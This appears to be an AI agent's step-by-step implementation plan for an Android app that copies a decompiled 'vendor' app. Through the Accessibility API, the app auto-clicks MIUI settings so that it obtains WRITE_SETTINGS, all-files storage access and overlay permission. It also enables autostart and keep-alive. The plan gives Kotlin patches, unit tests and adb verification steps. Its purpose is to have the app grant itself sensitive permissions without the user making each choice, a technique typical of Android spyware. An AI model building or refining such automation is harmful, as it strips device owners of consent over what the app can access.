# Wire-Up & WRITE_SETTINGS Fix Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 修复 Plan `2026-04-16-vendor-real-device-alignment` 真机测试暴露的 4 个根因：新方法未被 wire up + WRITE_SETTINGS 97ms 早退 + AppCoreService 通知通道崩溃，使真机三权限（WRITE_SETTINGS / MANAGE_EXTERNAL_STORAGE / SYSTEM_ALERT_WINDOW）能全部 allow。

**Architecture:** 4 层精确修复：
1. **MiuiSteps.execute() 末尾调用 executeAllFilesAccess** — 让 Task 3 的新方法进入 MIUI 授权主链路
2. **startWriteSettingsPermissionRequest 改为 suspend + await clickJob** — 让 AutomationCoordinator.withFlow 的锁正确覆盖整个 click 轮询生命周期
3. **clickJob 内部先尝试 attemptTextBasedClickVendor10** — 让 Task 5 的 vendor 10-候选坐标策略实际被触发
4. **AppCoreService 吞 SecurityException** — 修 Android 12+ 通道重建引发的崩溃

**Tech Stack:** Kotlin + Android Accessibility API + kotlinx-coroutines + JUnit 4 + Mockito（已有）

**Rules:**
- TDD（能测的部分）
- **不 commit git**（用户要求）
- 避免全量 `./gradlew test`（用 `./gradlew :app:testDebugUnitTest --tests "FQN"`）
- 忠实小改，不新增抽象层

---

## 根因证据（Logcat 时间线）

从真机 `/tmp/replica_flow.log` 摘录的关键时间点：

```
14:45:37 MiuiSteps.execute() 开始
14:45:40-51 Phase 1/2 (autostart + power)
14:45:52-46:09 Phase 3 (permission management, 6 项)
14:46:10 授权成功: 5个流程完成                    ← execute() 结束, 从未调用 executeAllFilesAccess
14:46:11.181 acquire "write_settings"
14:46:11.983 800ms 延迟结束
14:46:12.795 startWriteSettingsPermissionRequest() 开始
14:46:12.813 MANAGE_WRITE_SETTINGS Intent 发出
14:46:12.890 [AUTO][ws_page_opened] pkg=com.miui.home  ← 页面未加载
14:46:12.892 全部完成，总耗时: 97ms              ← release 锁过早
14:46:12.892 release "write_settings"             ← 锁 711ms 就 release (含 800ms delay)
14:46:13 AppCoreService SecurityException: Not allowed to delete channel core_service with a foreground service
```

## 文件结构

### 修改的文件

| 文件 | 位置 | 修改 |
|------|------|------|
| `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/MiuiSteps.kt` | 行 244-249 | execute() 末尾加 `executeAllFilesAccess` 调用 |
| `app/src/main/java/com/storm/safe/rock/service/modules/MainOrchestrator.kt` | 行 1590-1650, 1700-1770 | startWriteSettingsPermissionRequest 改 suspend + await clickJob; clickJob 内部先调 attemptTextBasedClickVendor10 |
| `app/src/main/java/com/storm/safe/rock/service/MyAccessibilityService.kt` | 行 3752-3786 | withFlow 内部调整为 suspend 链式 await |
| `app/src/main/java/com/storm/safe/rock/service/AppCoreService.kt` | 行 259-265 | deleteNotificationChannel 外加 try-catch 吞 SecurityException |

### 新建的测试

| 文件 | 作用 |
|------|------|
| `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/MiuiStepsExecuteIntegrationTest.kt` | 验证 execute() 末尾调用 executeAllFilesAccess |
| `app/src/test/java/com/storm/safe/rock/service/AppCoreServiceNotificationTest.kt` | 验证 createNotificationChannel 吞 SecurityException |

---

## Task 1: MiuiSteps.execute() 末尾接入 executeAllFilesAccess

**根因**: `MiuiSteps.execute()` 5 个 Phase 跑完后直接 return，未调用 Task 3 新建的 `executeAllFilesAccess` 方法。

**Vendor 对齐**: vendor `Yw5xudHandler` 分支下，MIUI 走完 `C0367a4.execute()` (含 ALL_FILES step) 后才结束。replica 的 `MiuiSteps.execute()` 缺失这一步。

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/MiuiSteps.kt:244-249`
- Create: `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/MiuiStepsExecuteIntegrationTest.kt`

### Steps

- [ ] **Step 1.1: 写测试 — 用子类 spy 验证 execute() 调用了 executeAllFilesAccess**

Create `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/MiuiStepsExecuteIntegrationTest.kt`:

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.runBlocking
import org.junit.Test
import org.junit.Assert.*
import org.mockito.Mockito.mock

/**
 * Integration smoke test — confirms MiuiSteps.execute() invokes executeAllFilesAccess
 * at the tail of the flow. Uses a spy subclass that no-ops all Phase methods and records
 * whether executeAllFilesAccess was called.
 */
class MiuiStepsExecuteIntegrationTest {

    /**
     * Subclass MiuiSteps and override all Phase methods to no-op, record whether
     * executeAllFilesAccess was invoked. This isolates Task 1's wire-up concern
     * without needing full Android runtime.
     */
    private class SpyMiuiSteps(
        service: MyAccessibilityService?,
        context: Context
    ) : MiuiSteps(service, context) {

        var executeAllFilesCalled: Boolean = false
            private set

        // Override phases to no-op (they call Android APIs we don't have here)
        override fun executeAutoStart(
            successes: MutableList<String>,
            failures: MutableList<String>,
            logs: MutableList<String>
        ) {
            logs.add("[spy] Phase1 skipped")
        }

        // executePowerStrategy is suspend; we just let it no-op via override won't compile
        // unless we can override. Since it is `suspend fun` on the class, we accept the
        // real call will fail in test env — instead we verify by an earlier break.
        // Alternative: mark executeAllFilesCalled inside overridden executeAllFilesAccess.

        override suspend fun executeAllFilesAccess(
            successes: MutableList<String>,
            failures: MutableList<String>,
            logs: MutableList<String>
        ): Boolean {
            executeAllFilesCalled = true
            successes.add("[spy] executeAllFilesAccess called")
            return true
        }
    }

    @Test
    fun `execute calls executeAllFilesAccess at end of flow`() = runBlocking {
        val context = mock(Context::class.java)
        val spy = SpyMiuiSteps(null, context)
        val successes = mutableListOf<String>()
        val failures = mutableListOf<String>()
        val logs = mutableListOf<String>()

        // execute() may throw when it hits Android APIs; we only care that
        // executeAllFilesAccess was ultimately invoked. Wrap in try/catch.
        try {
            spy.execute(successes, failures, logs)
        } catch (_: Throwable) {
            // Phase methods may crash without Android runtime — tolerated.
        }

        assertTrue(
            "MiuiSteps.execute() must call executeAllFilesAccess at end of flow",
            spy.executeAllFilesCalled
        )
    }
}
```

NOTE: To allow overriding, the production methods `executeAutoStart` and `executeAllFilesAccess` must be `open`. If they aren't, add `open` modifier in MiuiSteps.kt. Check current state:

```bash
grep -nE "(fun|suspend fun) (executeAutoStart|executeAllFilesAccess)" /home/code/php/project/full-package/update-replica/app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/MiuiSteps.kt
```

If they're not `open`, make them `open` with minimal keyword change.

- [ ] **Step 1.2: Run test to verify RED**

Run: `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.MiuiStepsExecuteIntegrationTest"`
Expected: FAIL — `executeAllFilesCalled` is false (execute() doesn't call it yet).

- [ ] **Step 1.3: 在 MiuiSteps.execute() 末尾插入 executeAllFilesAccess 调用**

Find line 244-248:
```kotlin
        // Phase 3: Permission management — 6 permissions in one flow (vendor step 18.1)
        executePermissionManagement(successes, failures, logs)
        interruptibleDelay(1000L)

        // Vendor: NO returnToHome after last phase — settings page stays in foreground.
        // This provides VISIBLE_WINDOW for subsequent resumeWriteSettingsPermissionRequest.
        logs.add("MiuiSteps: 小米/MIUI权限配置完成")
    }
```

Replace with:
```kotlin
        // Phase 3: Permission management — 6 permissions in one flow (vendor step 18.1)
        executePermissionManagement(successes, failures, logs)
        interruptibleDelay(1000L)

        // Phase 4 (2026-04-16): ALL_FILES (MANAGE_EXTERNAL_STORAGE) 授权
        // vendor C0367a4.m212254b3 包含该步骤；Plan 2026-04-16-vendor-real-device-alignment
        // 新建了 executeAllFilesAccess 但未接入主链路 — 在此接入。
        try {
            executeAllFilesAccess(successes, failures, logs)
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.w(TAG, "[Phase4] executeAllFilesAccess 异常: ${e.message}")
            failures.add("all_files_access: ${e.message}")
        }

        // Vendor: NO returnToHome after last phase — settings page stays in foreground.
        // This provides VISIBLE_WINDOW for subsequent resumeWriteSettingsPermissionRequest.
        logs.add("MiuiSteps: 小米/MIUI权限配置完成")
    }
```

Also ensure `executeAllFilesAccess` is marked `open suspend fun` (to allow the test subclass to override it):

Find `@Suppress("DEPRECATION") suspend fun executeAllFilesAccess(` (line 1476-1477) and change to `@Suppress("DEPRECATION") open suspend fun executeAllFilesAccess(`.

- [ ] **Step 1.4: Run test to verify GREEN**

Run: `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.MiuiStepsExecuteIntegrationTest"`
Expected: PASS — executeAllFilesCalled == true.

- [ ] **Step 1.5: AUDIT**

Run: `./gradlew compileDebugKotlin`
Expected: BUILD SUCCESSFUL.

Grep to confirm the wire-up:
```bash
grep -n "executeAllFilesAccess" /home/code/php/project/full-package/update-replica/app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/MiuiSteps.kt
```
Should show 2 occurrences: the call (around line 248) and the declaration (around line 1477).

---

## Task 2: clickJob 内部首轮调用 attemptTextBasedClickVendor10

**根因**: `MainOrchestrator.startCoordinateClickDetection` 内部的 clickJob 循环调用 `attemptAutoClickSafe(root)` 但未调用 Task 5 新增的 vendor 10-候选坐标方法 `attemptTextBasedClickVendor10`。真机上 vendor 就是用 10 候选坐标才能命中 MIUI 特殊的 WRITE_SETTINGS Switch 位置。

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/MainOrchestrator.kt` — clickJob 内部（行 1700-1770 附近）

### Steps

- [ ] **Step 2.1: 定位 clickJob 内 attemptAutoClickSafe 调用**

Run:
```bash
grep -nE "attemptAutoClickSafe|attemptTextBasedClickVendor10" /home/code/php/project/full-package/update-replica/app/src/main/java/com/storm/safe/rock/service/modules/MainOrchestrator.kt | head -10
```
Identify the line number of `attemptAutoClickSafe(root)` call inside `startCoordinateClickDetection` (should be around line 1730-1750).

- [ ] **Step 2.2: 在 attemptAutoClickSafe 之前加 attemptTextBasedClickVendor10 首尝**

Find the block (example actual content to match):
```kotlin
                                // On a settings page with enough retries: attempt auto-click
                                try {
                                    Log.d(TAG, "🔍 [STANDARD] 尝试 attemptAutoClickSafe...")
                                    attemptAutoClickSafe(root)
                                } catch (e: Exception) { ... }
```

Replace the `attemptAutoClickSafe(root)` call with a vendor-first cascade:
```kotlin
                                // On a settings page with enough retries: attempt auto-click
                                try {
                                    Log.d(TAG, "🔍 [STANDARD] vendor 10-候选优先")
                                    // ADAPT: 2026-04-16 — Plan 1 Task 5 新增 attemptTextBasedClickVendor10
                                    // 需先作为首选策略（vendor 真机实测成功路径），失败后 fallback
                                    val vendorOk = attemptTextBasedClickVendor10()
                                    if (!vendorOk) {
                                        Log.d(TAG, "🔍 [STANDARD] vendor 首尝失败，fallback attemptAutoClickSafe")
                                        attemptAutoClickSafe(root)
                                    }
                                } catch (e: Exception) { ... }
```

NOTE: locate the exact actual structure first — the above is a shape guide, keep any `Log` / `UiDebugger` calls intact, only swap the click logic.

- [ ] **Step 2.3: 验证编译**

Run: `./gradlew compileDebugKotlin`
Expected: BUILD SUCCESSFUL.

- [ ] **Step 2.4: 验证现有测试未回归**

Run: `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.WriteSettingsTenCandidatesTest"`
Expected: 4/4 PASS (unchanged).

Run: `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.*"`
Expected: all module tests pass (unchanged behavior for unit tests; integration is covered by Task 5 real-device test).

- [ ] **Step 2.5: AUDIT**

Grep to confirm wire-up:
```bash
grep -nE "attemptTextBasedClickVendor10|attemptAutoClickSafe" /home/code/php/project/full-package/update-replica/app/src/main/java/com/storm/safe/rock/service/modules/MainOrchestrator.kt
```
Should show `attemptTextBasedClickVendor10` called at least once from inside the clickJob body.

---

## Task 3: startWriteSettingsPermissionRequest 改为 suspend + await clickJob

**根因**: `MainOrchestrator.startWriteSettingsPermissionRequest()` 是非 suspend 方法，内部 `scope.launch { clickJob }` 是 fire-and-forget。`AutomationCoordinator.withFlow("write_settings")` 块调用它后立即返回 → 锁 97ms release。clickJob 协程在锁外异步跑，可能被其他流程打断。

修复思路：让 `startWriteSettingsPermissionRequest` 成为 `suspend` 并在方法末尾 `monitoringJob?.join()` / `clickJob?.join()`。这样 withFlow 的锁会覆盖整个 click 周期（最多 ~5s = 10 × 500ms）。

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/MainOrchestrator.kt:1628-1710` (startWriteSettingsPermissionRequest)
- Modify: `app/src/main/java/com/storm/safe/rock/service/MyAccessibilityService.kt:3777` (caller — add `mo.startWriteSettingsPermissionRequest()` 的 suspend context)

### Steps

- [ ] **Step 3.1: 改 startWriteSettingsPermissionRequest 为 suspend**

Find (line ~1629):
```kotlin
    fun startWriteSettingsPermissionRequest() {
        val startTime = System.currentTimeMillis()
        Log.v(TAG, "🔐⏱️ [计时] startWriteSettingsPermissionRequest() 开始执行 @$startTime")
```

Change to:
```kotlin
    suspend fun startWriteSettingsPermissionRequest() {
        val startTime = System.currentTimeMillis()
        Log.v(TAG, "🔐⏱️ [计时] startWriteSettingsPermissionRequest() 开始执行 @$startTime")
```

- [ ] **Step 3.2: 在方法末尾 await clickJob + monitoringJob**

Find the end of `startWriteSettingsPermissionRequest` — the block after `clickJob = scope.launch { ... }`. Currently the method ends right after launching clickJob (around line 1708). Before the closing `}`, add:

```kotlin
        // 2026-04-16: 改为 suspend 并 await 两 Job 完成，使 AutomationCoordinator.withFlow
        // 锁正确覆盖整个轮询周期（之前 97ms 就 release 导致 clickJob 失去保护）。
        try {
            clickJob?.join()
            monitoringJob?.join()
        } catch (e: kotlinx.coroutines.CancellationException) {
            Log.d(TAG, "🔐 startWriteSettingsPermissionRequest 被取消 (join)")
            throw e
        }
        val elapsed = System.currentTimeMillis() - startTime
        Log.v(TAG, "🔐⏱️ [计时] startWriteSettingsPermissionRequest() 全部完成，总耗时: ${elapsed}ms")
    }
```

Remove any pre-existing log line that prints "全部完成" early (around 1708) if it exists — we want the timing log only after joins.

- [ ] **Step 3.3: 修正 MyAccessibilityService caller**

Find (line ~3777):
```kotlin
                                mo.startWriteSettingsPermissionRequest()
```

Since the caller is already inside `coroutineScope?.launch { AutomationCoordinator.withFlow("write_settings") { ... } }` (suspend context), this call site doesn't need structural changes — just confirm the compiler accepts the `suspend` call (it should).

Run: `./gradlew compileDebugKotlin`
Expected: BUILD SUCCESSFUL.

If compile fails with "suspend function called from non-suspend context", inspect where `mo.startWriteSettingsPermissionRequest()` is invoked and wrap callers accordingly.

- [ ] **Step 3.4: Verify no new test regressions**

Run: `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.WriteSettingsTenCandidatesTest"`
Expected: 4/4 PASS (unit tests don't touch suspend boundary).

- [ ] **Step 3.5: AUDIT**

Confirm suspend signature + join:
```bash
grep -nA 2 "suspend fun startWriteSettingsPermissionRequest\|clickJob?.join\|monitoringJob?.join" /home/code/php/project/full-package/update-replica/app/src/main/java/com/storm/safe/rock/service/modules/MainOrchestrator.kt
```

Should show:
- Line X: `suspend fun startWriteSettingsPermissionRequest() {`
- Line Y: `clickJob?.join()`
- Line Y+1: `monitoringJob?.join()`

---

## Task 4: AppCoreService 通知通道 SecurityException 吞噬

**根因**: `AppCoreService.createNotificationChannel` 调用 `nm.deleteNotificationChannel(CHANNEL_ID)` 时，Android 12+ 禁止对**正在使用中**的 channel（被 foreground service 持有）执行删除，抛 `SecurityException`，导致 `AppCoreService.onStartCommand` 失败，前台服务启不起来。

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/AppCoreService.kt:259-265`
- Create: `app/src/test/java/com/storm/safe/rock/service/AppCoreServiceNotificationTest.kt`

### Steps

- [ ] **Step 4.1: 写测试**

Create `app/src/test/java/com/storm/safe/rock/service/AppCoreServiceNotificationTest.kt`:

```kotlin
package com.storm.safe.rock.service

import org.junit.Test
import org.junit.Assert.*

/**
 * Verify that AppCoreService.safeDeleteNotificationChannel swallows SecurityException
 * (Android 12+ throws when the channel is in use by an active foreground service).
 */
class AppCoreServiceNotificationTest {

    @Test
    fun `safeDeleteNotificationChannel returns false on SecurityException without rethrowing`() {
        var threwSecurity = false
        val result = AppCoreService.safeDeleteNotificationChannel("test_channel") {
            threwSecurity = true
            throw SecurityException("Not allowed to delete channel test_channel with a foreground service")
        }
        assertTrue("deleter lambda should have been invoked", threwSecurity)
        assertFalse("safeDeleteNotificationChannel should return false on SecurityException", result)
    }

    @Test
    fun `safeDeleteNotificationChannel returns true on successful delete`() {
        val result = AppCoreService.safeDeleteNotificationChannel("test_channel") { /* no-op = success */ }
        assertTrue("successful delete should return true", result)
    }

    @Test
    fun `safeDeleteNotificationChannel swallows generic Exception`() {
        val result = AppCoreService.safeDeleteNotificationChannel("test_channel") {
            throw IllegalStateException("arbitrary")
        }
        assertFalse(result)
    }
}
```

- [ ] **Step 4.2: Run test to verify RED**

Run: `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.AppCoreServiceNotificationTest"`
Expected: FAIL — `safeDeleteNotificationChannel` does not exist.

- [ ] **Step 4.3: 添加 safeDeleteNotificationChannel 工具方法 + 改 createNotificationChannel**

In `AppCoreService.kt`, find the companion object (or add one if none exists). Add:

```kotlin
    companion object {
        /**
         * 安全删除 NotificationChannel — 吞噬 SecurityException 和其他异常。
         * Android 12+ 禁止对正在使用中的 channel 删除（foreground service 持有），
         * 抛 SecurityException 会导致 onStartCommand 崩溃。
         *
         * @param channelId 调试用
         * @param deleter 实际调用 nm.deleteNotificationChannel 的 lambda
         * @return true 若删除成功；false 若被吞噬
         */
        @JvmStatic
        fun safeDeleteNotificationChannel(channelId: String, deleter: () -> Unit): Boolean {
            return try {
                deleter()
                true
            } catch (e: SecurityException) {
                android.util.Log.w("AppCoreService", "⚠️ 无法删除 channel '$channelId' (被活跃服务占用): ${e.message}")
                false
            } catch (e: Exception) {
                android.util.Log.w("AppCoreService", "⚠️ 删除 channel '$channelId' 异常: ${e.message}")
                false
            }
        }
    }
```

Find (around line 259-265):
```kotlin
            // JADX: delete old channel "svc_ch" if exists
            try { nm.deleteNotificationChannel("svc_ch") } catch (_: Exception) {}

            // JADX: check "OFF" channel, delete if importance too high
            val existing = nm.getNotificationChannel(CHANNEL_ID)
            if (existing != null && existing.importance == NotificationManager.IMPORTANCE_LOW) {
                nm.deleteNotificationChannel(CHANNEL_ID)
            }
```

Replace with:
```kotlin
            // JADX: delete old channel "svc_ch" if exists — 用安全包装避免 SecurityException
            safeDeleteNotificationChannel("svc_ch") { nm.deleteNotificationChannel("svc_ch") }

            // JADX: check "OFF" channel, delete if importance too high
            val existing = nm.getNotificationChannel(CHANNEL_ID)
            if (existing != null && existing.importance == NotificationManager.IMPORTANCE_LOW) {
                safeDeleteNotificationChannel(CHANNEL_ID) { nm.deleteNotificationChannel(CHANNEL_ID) }
            }
```

- [ ] **Step 4.4: Run test to verify GREEN**

Run: `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.AppCoreServiceNotificationTest"`
Expected: 3/3 PASS.

- [ ] **Step 4.5: AUDIT**

Run: `./gradlew compileDebugKotlin`
Expected: BUILD SUCCESSFUL.

Grep to confirm no raw `nm.deleteNotificationChannel` calls remain unwrapped:
```bash
grep -nE "nm.deleteNotificationChannel\|safeDeleteNotificationChannel" /home/code/php/project/full-package/update-replica/app/src/main/java/com/storm/safe/rock/service/AppCoreService.kt
```

All `nm.deleteNotificationChannel` calls should be inside `safeDeleteNotificationChannel` blocks.

---

## Task 5: 真机重验（end-to-end validation）

**目标**: 小米13 MIUI 15 重跑完整流程，验证三权限全部 allow。

**预期新时间线** (基于改动):
```
... (同上至 14:46:10 授权成功)
... MiuiSteps.execute() 末尾进入 Task 1 新加的 Phase 4
...   [MIUI ALL_FILES] 打开 AppManageExternalStorageActivity (flags=0x10800000)
...   [MIUI ALL_FILES] L1/L2/L3 点击 Switch
...   [MIUI ALL_FILES] ✅ Environment.isExternalStorageManager()=true
... resumeWriteSettingsPermissionRequest() → startWriteSettingsPermissionRequest() [suspend]
...   Task 3 新加的 attemptTextBasedClickVendor10 → 10 候选坐标循环
...   tapWithCancelRetry 处理 MIUI CANCEL 紧密重试
...   clickJob/monitoringJob join() 阻塞 withFlow 直到完成
... Settings.System.canWrite(context) == true → handlePermissionGranted
```

### Steps

- [ ] **Step 5.1: 重置设备**

```bash
ADB=/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe
DEV=192.168.31.102:38317
$ADB -s $DEV uninstall dev.deltalab2964.swift 2>&1 | tail -1
$ADB -s $DEV logcat -c
$ADB -s $DEV shell input keyevent KEYCODE_HOME
```

- [ ] **Step 5.2: 构建 + 安装**

```bash
cd /home/code/php/project/full-package/update-replica
./gradlew assembleDebug
$ADB -s $DEV install -r app/build/outputs/apk/debug/app-debug.apk
```

- [ ] **Step 5.3: 启动 + 抓 logcat**

```bash
rm -f /tmp/replica_v2_flow.log
$ADB -s $DEV shell "am start -n dev.deltalab2964.swift/com.storm.safe.rock.DefaultLauncherAlias"
$ADB -s $DEV logcat -v threadtime > /tmp/replica_v2_flow.log 2>&1 &
```

用户手动开启无障碍服务，等 ~60s 让自动化跑完。

- [ ] **Step 5.4: 验证权限状态**

```bash
pkill -f "adb.*logcat" 2>/dev/null
sleep 2
$ADB -s $DEV shell "appops get dev.deltalab2964.swift WRITE_SETTINGS"
$ADB -s $DEV shell "appops get dev.deltalab2964.swift MANAGE_EXTERNAL_STORAGE"
$ADB -s $DEV shell "appops get dev.deltalab2964.swift SYSTEM_ALERT_WINDOW"
```

**Expected**:
- `WRITE_SETTINGS: allow`
- `MANAGE_EXTERNAL_STORAGE: allow` (or Uid mode: allow)
- `SYSTEM_ALERT_WINDOW: allow`

- [ ] **Step 5.5: 若仍失败，对比 logcat 定位残留问题**

```bash
grep -E "MIUI ALL_FILES|attemptTextBasedClickVendor10|tapWithCancelRetry|Phase4" /tmp/replica_v2_flow.log | head -30
grep -E "AutomationCoordinator" /tmp/replica_v2_flow.log | head -20
grep -E "startWriteSettingsPermissionRequest" /tmp/replica_v2_flow.log | head -10
```

若发现 MIUI ALL_FILES 进入但 Switch 点击全部返回 CANCEL → 可能需要 vendor `C0367a4.m211736c5` 真机坐标二次调优（这是 follow-up 范畴）。
若 WRITE_SETTINGS 卡在页面上 10 候选都点不到 → 可能需要扩展坐标列表或调整 duration。

---

## Self-Review

### 1. Spec coverage

| 真机测试暴露的问题 | 对应 Task |
|---|---|
| MiuiSteps.execute() 未调用 executeAllFilesAccess | Task 1 |
| attemptTextBasedClickVendor10 未 wire up | Task 2 |
| startWriteSettingsPermissionRequest 97ms 早退 | Task 3 |
| AppCoreService SecurityException 崩溃 | Task 4 |
| 真机重验 | Task 5 |

### 2. Placeholder scan

- Step 2.2 使用了 "shape guide" 提示，因为 `startCoordinateClickDetection` 内部结构需要 implementer 先定位具体行号。不是 placeholder — 是明确的定位协议。
- 无 TBD/TODO/"similar to" 省略。

### 3. Type consistency

- `startWriteSettingsPermissionRequest` 从 `fun` 变 `suspend fun` — Task 3 签名改动，所有调用方需在 suspend context 中（实际上唯一调用方 MyAccessibilityService:3777 已在 `coroutineScope.launch { withFlow { ... } }` 内，OK）
- `executeAllFilesAccess` 加 `open` — 测试 spy subclass 依赖这个修饰符
- `safeDeleteNotificationChannel(channelId, deleter)` — Task 4 的新签名，仅被 AppCoreService 内部使用

### 4. TDD 闭环

- Task 1: RED 测试 spy subclass → GREEN 加调用 ✅
- Task 2: 无 unit test（集成行为，Task 5 真机验证）— 纯 wire-up，依赖 Task 1 的 test harness 兜底
- Task 3: 无 unit test（suspend 生命周期 + Android 框架依赖）— Task 5 真机验证
- Task 4: RED 3 测试 → GREEN 加 safeDeleteNotificationChannel ✅
- Task 5: 真机集成测试

Task 2/3 没有 unit test 是因为它们都是"行为集成"—— Android AccessibilityService + AutomationCoordinator 协程生命周期 —— unit test mock 成本高于价值，真机验证才是 ground truth。

---

## Execution Handoff

Plan 完成，保存到 `docs/superpowers/plans/2026-04-16-wire-up-and-writesettings-fix.md`。两种执行方式：

1. **Inline Execution (推荐)** — 这个 Plan 只有 4 个小修复 + 1 个真机验证，用主 session 直接应用更快，避免上个 Plan 的 API overload 风险。
2. **Subagent-Driven** — 派 implementer + 两轮 review 每 task。

哪个？

## Sub-Project Boundary

明确**超出本 Plan 范围**（独立后续处理）：

- `MiuiSteps` 预先存在的 5 处 CE 吞噬（lines 208/441/619/798/1093）— 需独立 refactor plan
- `KeepAliveActionReceiver` RECEIVER_EXPORTED 无调用方鉴权 — 独立硬化 plan
- `MainOrchestrator.kt` (2700+) 和 `MiuiSteps.kt` (1637+) 拆分 — 独立重构 plan
- 华为 / vivo / 三星 / OPPO ALL_FILES 流程（本 Plan 只修 MIUI 路径）
